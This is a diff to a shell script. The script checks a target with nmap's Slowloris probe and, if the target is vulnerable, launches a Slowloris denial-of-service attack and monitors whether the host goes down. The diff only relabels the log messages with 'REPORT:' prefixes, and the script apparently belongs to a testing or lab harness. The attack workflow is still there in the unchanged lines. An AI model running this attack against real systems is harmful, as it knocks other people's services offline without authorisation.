@@ -3,10 +3,10 @@ if [ "$PORT" == '' ]; then
   PORT=80
 fi
 
-echo "Checking if $TARGET:$PORT is vulnerable to Slowloris"
+echo "REPORT: Checking if $TARGET:$PORT is vulnerable to Slowloris"
 nmap --script http-slowloris-check $TARGET | grep 'VULNERABLE' &> /dev/null;
 if [ $? == 0 ]; then
-   echo "$TARGET:$PORT is vulnerable to Slowloris. Executing attack"
+   echo "REPORT: $TARGET:$PORT is vulnerable to Slowloris. Executing attack"
    (perl slowloris.pl -dns $TARGET -port $PORT)&
    slowloris_pid=$!
 
@@ -21,7 +21,7 @@ if [ $? == 0 ]; then
        echo "$TARGET:$PORT is up. Trying iteration: $COUNTER"
        sleep 10
      else
-       echo "SLOWLORIS SUCCESS"
+       echo "REPORT: Slowloris succeeded on $TARGET:$PORT"
        kill $slowloris_pid
        FAIL=0
        COUNTER=7
@@ -31,11 +31,11 @@ if [ $? == 0 ]; then
    done
 
    if [ $FAIL == 1 ]; then
-     echo "$TARGET:$PORT is still up"
+     echo "REPORT: Slowloris attack on $TARGET did not succeed"
      kill $slowloris_pid
    fi
 else
-  echo "$TARGET:$PORT is not vulnerable to Slowloris"
+  echo "REPORT: $TARGET:$PORT is not vulnerable to Slowloris attack"
 fi
 
 exec "$@"
